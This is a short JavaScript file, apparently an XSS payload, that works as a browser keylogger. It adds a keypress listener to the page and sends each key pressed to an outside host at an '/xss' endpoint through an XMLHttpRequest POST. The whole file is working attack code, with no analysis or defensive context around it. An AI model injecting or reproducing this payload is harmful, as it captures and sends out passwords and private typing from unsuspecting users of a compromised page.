
function ajaxRequest (method, url, data) {
    var xmlHttp = new XMLHttpRequest()

    xmlHttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            console.log(this.responseText);
        }
    };

    if (xmlHttp.overrideMimeType) {
        xmlHttp.overrideMimeType('text/plain; charset=x-user-defined')
    }

    xmlHttp.open(method, url, true)
    // xmlHttp.setRequestHeader('Content-Type', 'application/json');

    xmlHttp.setRequestHeader("Content-type", "application/json");
    xmlHttp.setRequestHeader('Access-Control-Allow-Headers', '*');
    xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
    xmlHttp.send(data)
    return xmlHttp
}

document.addEventListener('keypress', function (e) {
    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
})